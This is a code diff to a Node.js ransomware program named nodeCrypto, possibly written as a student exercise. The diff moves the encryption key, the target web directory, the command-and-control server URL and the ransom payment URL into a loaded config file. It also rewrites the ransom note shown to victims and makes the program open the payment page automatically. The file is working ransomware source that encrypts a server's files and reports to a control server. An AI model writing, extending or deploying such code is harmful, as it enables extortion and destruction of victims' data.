@@ -5,10 +5,17 @@ const path = require('path');
 const Cryptr = require('cryptr');
 const boxen = require('boxen');
 // Editable variables
-const privateKey = 'myTotalySecretKey';
-const websitePath = '/var/www/html/';
-const serverCC = 'http://localhost/serveur/?page=insert'; //TODO: check ssl
-const openReward = false;
+let rawdata = fs.readFileSync('nodecrypto-config.js');
+let student = JSON.parse(rawdata);
+
+const privateKey = student.privateKey;
+const websitePath = student.websitePath;
+const serverCC = student.serverCC; //TODO: check ssl
+const openReward = student.openReward;
+const rewardUrl = student.rewardUrl;
+const contactMail = student.contactMail;
+
+//console.log(openReward);
  
 function readFiles(dir, processFile) {
   //https://stackoverflow.com/a/49601340/1507900
@@ -96,7 +103,7 @@ function startRansome(){
 //start 
 fs.stat('config.json', function(err) {
     if (!err) {
-        console.log(boxen('You are already infected by nodeCrypto ransomware!\nTo retrieve your data, follow these instructions:\n1/ Go on website:\n2/\n3/', {padding: 1, margin: 1, borderStyle: 'double', borderColor: 'red'}));
+        console.log(boxen('You are already infected by nodeCrypto ransomware!\nTo retrieve your data, follow these instructions:\n\n1/ Dont panic! \n2/ Go on website: '+rewardUrl+'\n3/ Or contact us: '+contactMail , {padding: 1, margin: 1, borderStyle: 'double', borderColor: 'red'}));
     }
     else if (err.code === 'ENOENT') {
 		createConfig();
@@ -104,6 +111,9 @@ fs.stat('config.json', function(err) {
 		startRansome();
 		console.log(boxen('Your files are encrypted by nodeCrypto ransomware!', {padding: 1, margin: 1, borderStyle: 'double', borderColor: 'red'}));
 		if(openReward)
-			require("openurl").open("http://localhost/client/");
+			require("openurl").open(rewardUrl);
     }
+	return;
 });
+ 
+
